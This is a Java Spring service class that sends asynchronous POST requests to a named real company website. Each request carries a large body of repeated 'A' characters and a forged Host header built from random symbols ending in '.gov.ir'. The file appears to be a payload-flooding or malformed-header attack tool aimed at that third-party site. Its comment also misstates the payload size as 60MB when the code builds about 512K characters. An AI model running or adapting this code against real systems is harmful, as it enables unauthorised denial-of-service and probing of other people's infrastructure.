package cellbox.neorial.service;

import org.apache.http.HttpEntity;
import org.apache.http.HttpHost;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.client.methods.RequestBuilder;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;

import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.Random;


@Service
public class LargePayloadService {

    StringEntity largePayload =new StringEntity( new String(new char[1 * 512 * 1024]).replace('\0', 'A')); // 60MB of 'A'

    public LargePayloadService() throws UnsupportedEncodingException {
    }

    @Async
    public void sendLargePayload() throws IOException {

        CloseableHttpClient httpClient = HttpClients.custom()
//                .setProxy(new HttpHost("127.0.0.1", 8080)) // Replace with your proxy settings
                .build();
        HttpUriRequest request = RequestBuilder.post()
                .setUri("https://my.ampol.com.au")
                .setHeader("Host", host())
                .setEntity(largePayload)
                .build();

        HttpResponse response = httpClient.execute(request);
        System.out.println(response);
        HttpEntity entity = response.getEntity();

        // Convert the entity to a string
        String responseBody = EntityUtils.toString(entity);
        System.out.println(responseBody+"\n");

    }

    public String host(){
        // Define the characters to choose from
        String characters = "',÷^×*#$?()<\\";

        // Create a StringBuilder to hold the result
        StringBuilder result = new StringBuilder(5);

        // Create an instance of Random
        Random random = new Random();

        // Randomly select 4 characters from the characters string
        for (int i = 0; i < 5; i++) {
            int randomIndex = random.nextInt(characters.length());
            result.append(characters.charAt(randomIndex));
        }

        // Convert the result to a string
        return result.toString()+".gov.ir";
    }
}